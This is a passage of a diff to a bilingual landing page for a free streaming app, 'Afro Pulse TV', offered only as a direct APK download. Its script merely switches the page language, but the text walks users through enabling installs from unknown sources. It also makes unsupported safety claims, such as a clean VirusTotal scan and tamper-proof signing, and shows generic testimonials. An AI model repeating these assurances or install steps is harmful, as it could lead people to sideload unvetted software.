before anyone else.',feat5_h:'Massive Channel Library',feat5_p:'Live channels across news, sports, entertainment, kids, and documentaries from around the world.',feat6_h:'Optimized for Android',feat6_p:'Fast launch, smooth playback, and responsive controls designed for Android devices.',bigfeat_h:'⚡ Watch together, even apart',bigfeat_1:'<strong>Sync Play</strong> — watch in perfect sync with friends, anywhere in the world',bigfeat_2:'<strong>5 Profiles</strong> — each with personalized recommendations',bigfeat_3:'<strong>Kids Mode</strong> — safe, curated content for the little ones',bigfeat_4:'<strong>AI Subtitles</strong> — real-time translation in 40+ languages',reviews_label:'Loved by Millions',reviews_h_a:"Don't take our",reviews_h_b:'word for it',review1:'"Finally an app that actually delivers. The 4K quality is insane and offline downloads saved my commute. Cancelled everything else."',review2:'"Multi-device sync is flawless. I start on my TV, finish on my phone in bed. The library is massive and the AI recommendations are scary good."',review3:'"Kids Mode is a lifesaver. My children have their own space and I don\'t worry about what they\'ll find. Best streaming app for families hands down."',verified_user:'Verified User',stat1:'Downloads Worldwide',stat1_desc:'Downloads Worldwide',stat2:'Average Rating',stat3:'Countries Available',stat4:'Uptime Guarantee',sec_label:'Safe & Verified',sec_h_a:'Your security',sec_h_b:'is our priority',sec_sub:'Every release is scanned, signed, and verified before it reaches you.',sec1_a:'VirusTotal Scanned',sec1_b:'100% clean · 72 engines passed',sec2_a:'SHA-256 Signed',sec2_b:'Cryptographically verified · tamper-proof',sec3_a:'Auto-Update',sec3_b:'Get the latest version as soon as we release',sec4_a:'No Permissions Abuse',sec4_b:"Only requests what's strictly needed",faq_label:'FAQ',faq_h_a:'Got questions?',faq_h_b:"We've got answers.",faq1_q:'Is the APK safe to install?',faq1_a:'Absolutely. Every release goes through VirusTotal scanning (72+ engines), SHA-256 code signing, and manual security review before publication. We never bundle adware, spyware, or unwanted software. You can verify the signature yourself using the hash published on our security page.',faq2_q:"Why isn't the app on Google Play or App Store?",faq2_a:"We're currently in a rapid iteration phase — shipping updates every 2 weeks with new features and improvements. Direct distribution lets us move faster without app store review delays. App store listings are planned for late 2026 once we hit our feature-complete milestone. Same app, same quality, just faster updates for you.",faq3_q:'How do I install the APK on Android?',faq3_a:'1. Tap the Download APK button above.<br>2. Open the downloaded .apk file.<br>3. If prompted, allow "Install from unknown sources" in Settings → Security.<br>4. Tap Install and you\'re done! The app will auto-update itself after that — no need to manually download future versions.',faq4_q:"Is it really free? What's the catch?",faq4_a:"Yes — 100% free. No hidden fees, no forced subscriptions, no paywalls on content. We're building our user base and believe that if we make the best streaming experience, growth follows. Premium features (like offline downloads and 4K) are also free during our launch period. Enjoy it while it lasts!",faq5_q:'Which devices and OS versions are supported?',faq5_a:'Android 8.0 (Oreo) and above for the APK. iOS 14+ for the IPA. Works on phones, tablets, Android TV, and Fire TV Stick. We recommend at least 2 GB of RAM for the best 4K streaming experience. Chromecast and AirPlay support are built in.',faq6_q:'How do I get updates after installing?',faq6_a:'The app has a built-in auto-updater. When a new version is available, you\'ll get a notification inside the app — just tap "Update" and it handles everything. No need to revisit this page or manually download again. We push updates every ~2 weeks with fixes and new features.',footer_copy:'© 2026 Afro Pulse TV',footer_priv:'Privacy',footer_terms:'Terms',footer_sec:'Security',float_cta:'Download Free'
+},
+es:{
+hero_eyebrow:'#1 App de Entretenimiento · 2026',hero_title_a:'Cine en tu',hero_title_b:'bolsillo',hero_desc:'Transmite blockbusters, mira TV en vivo, descarga para ver sin conexión — todo en impresionante 4K HDR. Sin anuncios. Nunca.',hero_stat1:'Usuarios Activos',hero_stat2:'App Store',hero_stat3:'Calidad',hero_cta:'Descargar Gratis — Comienza a Ver',scroll_hint:'Desliza',trending_label:'Tendencias',trending_h_a:'Lo que el mundo',trending_h_b:'está viendo',trending_sub:'Selecciones principales, actualizadas a diario',card_hot:'POPULAR',card_new:'NUEVO',card_top:'TOP',card_4k:'4K',card_hd:'HD',live_titles:'Títulos',live_rating:'Puntuación',live_downloads:'Descargas',feat_label:'Por Qué Afro Pulse TV',feat_h_a:'Todo lo que',feat_h_b:'necesitas. Nada más.',feat1_h:'4K HDR',feat1_p:'Dolby Vision y Atmos. Calidad cinematográfica en tus manos.',feat2_h:'Modo Sin Conexión',feat2_p:'Descarga lo que quieras. Mira en aviones, trenes, donde sea.',feat3_h:'Multi-Dispositivo',feat3_p:'Teléfono, tablet, TV — pausa en uno, continúa en otro.',feat4_h:'Acceso Anticipado',feat4_p:'Estrenos exclusivos y contenido detrás de cámaras antes que nadie.',feat5_h:'Amplia Biblioteca de Canales',feat5_p:'Canales en vivo de noticias, deportes, entretenimiento, niños y documentales de todo el mundo.',feat6_h:'Optimizado para Android',feat6_p:'Inicio rápido, reproducción fluida y controles receptivos diseñados para dispositivos Android.',bigfeat_h:'⚡ Mira juntos, incluso separados',bigfeat_1:'<strong>Sync Play</strong> — mira en perfecta sincronía con amigos, en cualquier parte del mundo',bigfeat_2:'<strong>5 Perfiles</strong> — cada uno con recomendaciones personalizadas',bigfeat_3:'<strong>Modo Niños</strong> — contenido seguro y curado para los más pequeños',bigfeat_4:'<strong>Subtítulos IA</strong> — traducción en tiempo real en más de 40 idiomas',reviews_label:'Amado por Millones',reviews_h_a:'No creas solo',reviews_h_b:'nuestra palabra',review1:'"Por fin una app que cumple. La calidad 4K es increíble y las descargas sin conexión salvaron mi viaje. Cancelé todo lo demás."',review2:'"La sincronización multi-dispositivo es perfecta. Empiezo en mi TV, termino en mi teléfono en la cama. La biblioteca es enorme y las recomendaciones de IA son increíblemente precisas."',review3:'"El Modo Niños es un salvavidas. Mis hijos tienen su propio espacio y no me preocupa lo que puedan encontrar. Mejor app de streaming para familias sin duda."',verified_user:'Usuario Verificado',stat1:'Descargas en Todo el Mundo',stat1_desc:'Descargas en Todo el Mundo',stat2:'Puntuación Media',stat3:'Países Disponibles',stat4:'Garantía de Disponibilidad',sec_label:'Seguro y Verificado',sec_h_a:'Tu seguridad es',sec_h_b:'nuestra prioridad',sec_sub:'Cada versión es analizada, firmada y verificada antes de llegar a ti.',sec1_a:'VirusTotal Analizado',sec1_b:'100% limpio · 72 motores aprobados',sec2_a:'Firmado SHA-256',sec2_b:'Verificado criptográficamente · a prueba de manipulaciones',sec3_a:'Actualización Automática',sec3_b:'Recibe la última versión tan pronto como la publicamos',sec4_a:'Sin Abuso de Permisos',sec4_b:'Solo solicita lo estrictamente necesario',faq_label:'Preguntas Frecuentes',faq_h_a:'¿Tienes preguntas?',faq_h_b:'Tenemos respuestas.',faq1_q:'¿Es seguro instalar el APK?',faq1_a:'Absolutamente. Cada versión pasa por el análisis de VirusTotal (más de 72 motores), firma de código SHA-256 y revisión de seguridad manual antes de su publicación. Nunca incluimos adware, spyware ni software no deseado. Puedes verificar la firma tú mismo usando el hash publicado en nuestra página de seguridad.',faq2_q:'¿Por qué la app no está en Google Play o App Store?',faq2_a:'Estamos en una fase de iteración rápida — publicando actualizaciones cada 2 semanas con nuevas funciones y mejoras. La distribución directa nos permite avanzar más rápido sin los retrasos de revisión de las tiendas de aplicaciones. Las publicaciones en tiendas están planificadas para finales de 2026 una vez que alcancemos nuestro hito de funciones completas. La misma app, la misma calidad, solo que con actualizaciones más rápidas para ti.',faq3_q:'¿Cómo instalo el APK en Android?',faq3_a:'1. Toca el botón Descargar APK arriba.<br>2. Abre el archivo .apk descargado.<br>3. Si se te solicita, permite "Instalar desde fuentes desconocidas" en Configuración → Seguridad.<br>4. ¡Toca Instalar y listo! La app se actualizará automáticamente después — no necesitas descargar manualmente versiones futuras.',faq4_q:'¿Es realmente gratis? ¿Cuál es la trampa?',faq4_a:'Sí — 100% gratis. Sin cargos ocultos, sin suscripciones forzadas, sin muros de pago en el contenido. Estamos construyendo nuestra base de usuarios y creemos que si hacemos la mejor experiencia de streaming, el crecimiento llega solo. Las funciones premium (como descargas sin conexión y 4K) también son gratuitas durante nuestro período de lanzamiento. ¡Disfrútalas mientras dure!',faq5_q:'¿Qué dispositivos y versiones de SO son compatibles?',faq5_a:'Android 8.0 (Oreo) y superior para el APK. iOS 14+ para el IPA. Funciona en teléfonos, tabletas, Android TV y Fire TV Stick. Recomendamos al menos 2 GB de RAM para la mejor experiencia de streaming 4K. Chromecast y AirPlay están integrados.',faq6_q:'¿Cómo obtengo actualizaciones después de instalar?',faq6_a:'La app tiene un actualizador automático integrado. Cuando una nueva versión esté disponible, recibirás una notificación dentro de la app — solo toca "Actualizar" y se encarga de todo. No necesitas volver a visitar esta página ni descargar manualmente de nuevo. Publicamos actualizaciones aproximadamente cada 2 semanas con correcciones y nuevas funciones.',footer_copy:'© 2026 Afro Pulse TV',footer_priv:'Privacidad',footer_terms:'Términos',footer_sec:'Seguridad',float_cta:'Descargar Gratis'
+}
+};
+var lang=(function(){var p=window.location.pathname.toLowerCase();if(p.indexOf('estv')!==-1)return 'es';if(p.indexOf('index')!==-1)return 'en';var s=localStorage.getItem('sflix_lang');if(s==='en'||s==='es')return s;return 'en'})();
+function applyLanguage(l){
+document.documentElement.lang=l;var els=document.querySelectorAll('[data-i18n]');
+for(var i=0;i<els.length;i++){var k=els[i].getAttribute('data-i18n');if(T[l]&&T[l][k]!==undefined){var v=T[l][k];if(v.indexOf('<')!==-1&&v.indexOf('>')!==-1){els[i].innerHTML=v}else{els[i].textContent=v}}}
+if(l==='es'){document.title='Afro Pulse TV — Cine en tu Bolsillo';var md=document.querySelector('meta[name="description"]');if(md)md.setAttribute('content','Afro Pulse TV — Transmite blockbusters, mira TV en vivo y sin conexión en 4K HDR. Sin anuncios. Descarga el APK gratis para Android.')}
+localStorage.setItem('sflix_lang',l)
+}
+applyLanguage(lang);
+})();
+</script>
+</body>
+</html>
